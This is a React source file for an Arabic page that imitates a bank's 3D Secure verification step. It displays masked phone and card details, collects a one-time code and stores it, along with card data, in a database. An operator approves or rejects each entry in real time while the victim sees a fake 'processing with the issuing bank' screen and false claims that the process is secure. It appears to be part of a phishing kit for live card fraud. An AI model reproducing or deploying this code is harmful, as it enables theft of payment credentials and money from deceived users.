import { useEffect, useMemo, useState } from "react";
import { useLocation, useNavigate } from "@/lib/router-compat";
import {
  ShieldCheck,
  KeyRound,
  Smartphone,
  CreditCard,
  Wallet,
  Loader2,
  XCircle,
} from "lucide-react";
import Header from "@/components/site/Header";
import SiteFooter from "@/components/site/SiteFooter";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { getApplication, updateApplication, type StoredApplication } from "@/lib/admin-storage";
import { supabase } from "@/integrations/supabase/client";

type OtpState = { appId?: string };

const PROCESSING_SECONDS = 60;

const QuoteOtp = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const stateAppId = ((location.state as OtpState) || {}).appId;
  const [appId, setAppId] = useState<string | undefined>(
    stateAppId ||
      (typeof sessionStorage !== "undefined"
        ? sessionStorage.getItem("bcare_current_app_id") || undefined
        : undefined),
  );

  const [otpValue, setOtpValue] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(60);
  const [submitting, setSubmitting] = useState(false);
  const [app, setApp] = useState<StoredApplication | null>(null);
  const [processing, setProcessing] = useState(false);
  const [processingSecs, setProcessingSecs] = useState(PROCESSING_SECONDS);
  const [rejected, setRejected] = useState(false);

  useEffect(() => {
    if (!appId) return;
    (async () => {
      const a = await getApplication(appId);
      if (a) setApp(a);
    })();
  }, [appId]);

  // Countdown for resend code
  useEffect(() => {
    if (secondsLeft <= 0) return;
    const t = window.setTimeout(() => setSecondsLeft((s) => s - 1), 1000);
    return () => window.clearTimeout(t);
  }, [secondsLeft]);

  // Countdown while processing (waiting for admin)
  useEffect(() => {
    if (!processing) return;
    if (processingSecs <= 0) {
      // timeout — treat as rejection
      setProcessing(false);
      setRejected(true);
      setOtpValue("");
      toast.error("انتهت مهلة التحقق، حاول مرة أخرى");
      return;
    }
    const t = window.setTimeout(() => setProcessingSecs((s) => s - 1), 1000);
    return () => window.clearTimeout(t);
  }, [processing, processingSecs]);

  // Realtime: listen for admin decision while processing
  useEffect(() => {
    if (!appId || !processing) return;
    const channel = supabase
      .channel(`otp-decision-${appId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "applications", filter: `id=eq.${appId}` },
        (payload) => {
          const newRow = payload.new as { review_status?: string };
          if (newRow.review_status === "completed") {
            setProcessing(false);
            toast.success("تم تأكيد العملية بنجاح");
            setTimeout(() => navigate("/", { replace: true }), 800);
          } else if (newRow.review_status === "otp_rejected") {
            setProcessing(false);
            setRejected(true);
            setOtpValue("");
            toast.error("الرمز غير صحيح، حاول مرة أخرى");
          }
        },
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, [appId, processing, navigate]);

  const code = otpValue;
  const isValid = code.length >= 4 && code.length <= 6;

  const phoneLast3 = useMemo(() => {
    const digitsOnly = (app?.phone || "").replace(/\D/g, "");
    return digitsOnly.slice(-3) || "•••";
  }, [app?.phone]);

  const cardLast4 = useMemo(() => {
    const digitsOnly = (app?.cardNumber || "").replace(/\D/g, "");
    return digitsOnly.slice(-4) || "••••";
  }, [app?.cardNumber]);

  const amountText = useMemo(() => {
    const v = app?.total ?? app?.price;
    return v != null ? `${Number(v).toFixed(2)} ر.س` : "—";
  }, [app?.total, app?.price]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setSubmitting(true);
    setRejected(false);
    let currentId = appId;
    if (!currentId) {
      const { saveApplication } = await import("@/lib/admin-storage");
      const entry = await saveApplication({
        reviewStatus: "otp_submitted",
        otpCode: code,
      } as never);
      if (entry) {
        currentId = entry.id;
        setAppId(entry.id);
        try {
          sessionStorage.setItem("bcare_current_app_id", entry.id);
        } catch {}
      }
    } else {
      await updateApplication(currentId, {
        otpCode: code,
        reviewStatus: "otp_submitted",
      });
    }
    setSubmitting(false);
    setProcessingSecs(PROCESSING_SECONDS);
    setProcessing(true);
  };

  return (
    <main dir="rtl" className="min-h-screen bg-[hsl(210_40%_97%)]">
      <Header />

      <section className="mx-auto w-full max-w-[520px] px-3 py-6 sm:px-4 sm:py-8">
        <div className="overflow-hidden rounded-2xl bg-white shadow-card">
          {/* Bank-style header */}
          <div className="bg-gradient-to-br from-brand-blue to-[hsl(214_70%_30%)] px-5 py-5 text-white sm:px-7 sm:py-6">
            <div className="flex items-center gap-3">
              <div className="grid h-11 w-11 place-items-center rounded-full bg-white/15 backdrop-blur">
                <ShieldCheck className="h-5 w-5" strokeWidth={2.4} />
              </div>
              <div>
                <div className="text-[15px] font-extrabold sm:text-[16px]">
                  التحقق من العملية
                </div>
                <div className="text-[11.5px] text-white/80">
                  خدمة التحقق الآمن 3D Secure
                </div>
              </div>
            </div>
          </div>

          <div className="p-5 sm:p-7">
            {/* Transaction summary */}
            <div className="space-y-2.5 rounded-xl border border-border bg-muted/30 p-3.5 sm:p-4">
              <div className="flex items-center justify-between gap-3">
                <div className="flex items-center gap-2 text-[12.5px] text-muted-foreground">
                  <Smartphone className="h-4 w-4 text-brand-blue" />
                  <span>رقم الجوال</span>
                </div>
                <div className="font-mono text-[13px] font-extrabold text-brand-blue" dir="ltr">
                  •••••• {phoneLast3}
                </div>
              </div>
              <div className="h-px bg-border/70" />
              <div className="flex items-center justify-between gap-3">
                <div className="flex items-center gap-2 text-[12.5px] text-muted-foreground">
                  <CreditCard className="h-4 w-4 text-brand-blue" />
                  <span>البطاقة</span>
                </div>
                <div className="font-mono text-[13px] font-extrabold text-brand-blue" dir="ltr">
                  •••• •••• •••• {cardLast4}
                </div>
              </div>
              <div className="h-px bg-border/70" />
              <div className="flex items-center justify-between gap-3">
                <div className="flex items-center gap-2 text-[12.5px] text-muted-foreground">
                  <Wallet className="h-4 w-4 text-brand-blue" />
                  <span>قيمة العملية</span>
                </div>
                <div className="text-[15px] font-extrabold text-brand-blue">
                  {amountText}
                </div>
              </div>
            </div>

            {processing ? (
              /* Processing screen */
              <div className="mt-8 flex flex-col items-center text-center">
                <div className="relative grid h-20 w-20 place-items-center">
                  <div className="absolute inset-0 animate-ping rounded-full bg-brand-blue/20" />
                  <div className="grid h-16 w-16 place-items-center rounded-full bg-brand-blue/10 text-brand-blue">
                    <Loader2 className="h-8 w-8 animate-spin" strokeWidth={2.2} />
                  </div>
                </div>
                <h2 className="mt-5 text-[18px] font-extrabold text-brand-blue sm:text-[20px]">
                  جاري المعالجة...
                </h2>
                <p className="mt-2 max-w-[340px] text-[12.5px] leading-6 text-muted-foreground">
                  جاري التحقق من رمز OTP لدى البنك المُصدر للبطاقة.
                  من فضلك لا تغلق هذه الصفحة.
                </p>
                <div className="mt-5 flex items-center gap-2 rounded-full bg-muted/50 px-4 py-2 text-[12.5px] font-bold text-brand-blue">
                  <span>الوقت المتبقي</span>
                  <span className="font-mono text-[14px]">
                    {String(Math.floor(processingSecs / 60)).padStart(2, "0")}:
                    {String(processingSecs % 60).padStart(2, "0")}
                  </span>
                </div>
                <div className="mt-6 flex items-center justify-center gap-1.5 text-[11.5px] text-muted-foreground">
                  <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" />
                  <span>عملية مشفّرة وآمنة</span>
                </div>
              </div>
            ) : (
              <form onSubmit={handleSubmit}>
                <div className="mt-6 text-center">
                  <div className="mx-auto mb-3 grid h-12 w-12 place-items-center rounded-full bg-brand-blue/10 text-brand-blue">
                    <KeyRound className="h-5 w-5" strokeWidth={2.2} />
                  </div>
                  <h1 className="text-[18px] font-extrabold text-brand-blue sm:text-[20px]">
                    أدخل رمز التحقق
                  </h1>
                  <p className="mt-1.5 text-[12.5px] leading-6 text-muted-foreground">
                    تم إرسال رمز التحقق إلى رقم جوالك المنتهي بـ
                    <span className="mx-1 font-extrabold text-brand-blue" dir="ltr">
                      {phoneLast3}
                    </span>
                  </p>
                </div>

                {rejected && (
                  <div className="mt-4 flex items-start gap-2 rounded-xl border border-destructive/30 bg-destructive/5 p-3 text-[12.5px] text-destructive">
                    <XCircle className="mt-0.5 h-4 w-4 shrink-0" />
                    <span>الرمز غير صحيح أو تم رفض العملية. يرجى إدخال رمز جديد.</span>
                  </div>
                )}

                <div className="mt-5">
                  <label className="mb-2 block text-center text-[12px] font-bold text-muted-foreground">
                    رمز التحقق المكوّن من 4 إلى 6 أرقام
                  </label>
                  <input
                    id="otp-input"
                    value={otpValue}
                    onChange={(e) =>
                      setOtpValue(e.target.value.replace(/\D/g, "").slice(0, 6))
                    }
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={6}
                    placeholder="••••••"
                    dir="ltr"
                    className="h-16 w-full rounded-xl border-2 border-[hsl(214_25%_85%)] bg-white text-center font-mono text-[28px] font-extrabold tracking-[0.5em] text-brand-blue outline-none transition-colors placeholder:text-muted-foreground/40 focus:border-brand-blue sm:h-[68px] sm:text-[32px]"
                  />
                  <div className="mt-1.5 text-center text-[11px] text-muted-foreground">
                    {otpValue.length}/6 أرقام (الحد الأدنى 4)
                  </div>
                </div>

                <div className="mt-4 text-center text-[12.5px] text-muted-foreground">
                  {secondsLeft > 0 ? (
                    <>إعادة إرسال الرمز خلال {secondsLeft} ثانية</>
                  ) : (
                    <button
                      type="button"
                      onClick={() => setSecondsLeft(60)}
                      className="font-bold text-brand-blue underline"
                    >
                      إعادة إرسال الرمز
                    </button>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={!isValid || submitting}
                  className={cn(
                    "mt-6 h-[50px] w-full rounded-[10px] text-[15px] font-extrabold text-white shadow-soft transition-all",
                    isValid && !submitting
                      ? "bg-brand-blue hover:brightness-110"
                      : "cursor-not-allowed bg-[hsl(214_25%_70%)]",
                  )}
                >
                  {submitting ? "جاري الإرسال..." : "تأكيد العملية"}
                </button>

                <div className="mt-4 flex items-center justify-center gap-1.5 text-[11.5px] text-muted-foreground">
                  <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" />
                  <span>عملية مشفّرة وآمنة</span>
                </div>
              </form>
            )}
          </div>
        </div>
      </section>

      <SiteFooter />
    </main>
  );
};

export default QuoteOtp;
